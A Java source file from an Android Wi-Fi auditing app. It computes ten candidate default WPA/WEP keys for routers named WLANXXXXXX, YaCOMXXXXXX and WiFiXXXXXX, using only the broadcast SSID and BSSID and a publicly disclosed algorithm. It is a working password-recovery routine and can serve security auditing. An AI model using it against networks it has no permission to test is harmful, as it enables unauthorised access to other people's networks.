/*
 * Copyright (C) 2011 Roberto Estrada
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package es.glasspixel.wlanaudit.util;

import java.util.ArrayList;
import java.util.List;

import android.net.wifi.ScanResult;

/**
 * Default key calculator for networks with SSID form WLANXXXXXX, YACOMXXXXXX
 * and WiFiXXXXXX Generates a dictionary of ten possible keys.
 * 
 * Original algorithm from Mambostar
 * 
 * More info available at:
 * 
 * http://foro.seguridadwireless.net/comunicados-y-noticias
 * /wlan4xx-algoritmo-routers-yacom/
 * 
 * @author Roberto Estrada
 */
public class WiFiXXXXXXKeyCalculator implements IKeyCalculator {
	/**
	 * {@inheritDoc}
	 */
	@Override
	public List<String> getKey(ScanResult network) {
		// Derived keys
		List<String> keyList = new ArrayList<String>();

		// Public data
		String essid = trimSSID(network.SSID);
		String bssid = network.BSSID.replaceAll(":", "").toUpperCase();
		
		// Serial data (derived from public data)
		char S8, S9, S10, M9, M10, M11, M12;
		S8 = (char) hex2dec(essid.charAt(3));
		S9 = (char) hex2dec(essid.charAt(4));
		S10 = (char) hex2dec(essid.charAt(5));
		
		// M values (MAC) obtained from BSSID and ESSID
		M9 = essid.charAt(1);
		M10 = (char) hex2dec(essid.charAt(2));
		M11 = bssid.charAt(10);
		M12 = bssid.charAt(11);
		
		if(M11 >= 'A')
			M11 -= 55;
		if(M12 >= 'A')
			M12 -= 55;

		// Key derivation
		for (int S7 = 0; S7 < 10; S7++) {
			// Key values
			int X1, X2, X3, Y1, Y2, Y3, Z1, Z2, Z3, W1, W2, W3, W4;

			// S7+S8+M11+M12
			int K1 = S7 + S8 + M11 + M12;
			// M9+M10+S9+S10
			int K2 = M9 + M10 + S9 + S10;

			// X values
			X1 = K1 ^ S10;
			X2 = K1 ^ S9;
			X3 = K1 ^ S8;
			// Y values
			Y1 = K2 ^ M10;
			Y2 = K2 ^ M11;
			Y3 = K2 ^ M12;
			// Z values
			Z1 = M11 ^ S10;
			Z2 = M12 ^ S9;
			Z3 = K1 ^ K2;
			// W values
			W1 = X1 ^ Z2;
			W2 = Y2 ^ Y3;
			W3 = Y1 ^ X3;
			W4 = Z3 ^ X2;

			// Result composition
			String result = dec2hex(W4) + dec2hex(X1) + dec2hex(Y1)
					+ dec2hex(Z1) + dec2hex(W1) + dec2hex(X2) + dec2hex(Y2)
					+ dec2hex(Z2) + dec2hex(W2) + dec2hex(X3) + dec2hex(Y3)
					+ dec2hex(Z3) + dec2hex(W3);

			keyList.add(result.toUpperCase());
		}

		return keyList;
	}

	private String trimSSID(String ssid) {
		String result = null;
		if (ssid.contains("WLAN")) {
			result = ssid.replace("WLAN", "").toUpperCase();
		} else if (ssid.contains("YaCOM")) {
			result = ssid.replace("YaCOM", "").toUpperCase();
		} else if (ssid.contains("WiFi")) {
			result = ssid.replace("WiFi", "").toUpperCase();
		}
		return result;
	}

	private int hex2dec(char hex) {
		return hex2dec(String.valueOf(hex));
	}

	private int hex2dec(String hex) {
		int ret = Integer.parseInt(hex, 16);
		return ret;
	}

	private String dec2hex(int dec) {
		return Integer.toHexString(dec & 0xf);
	}

}
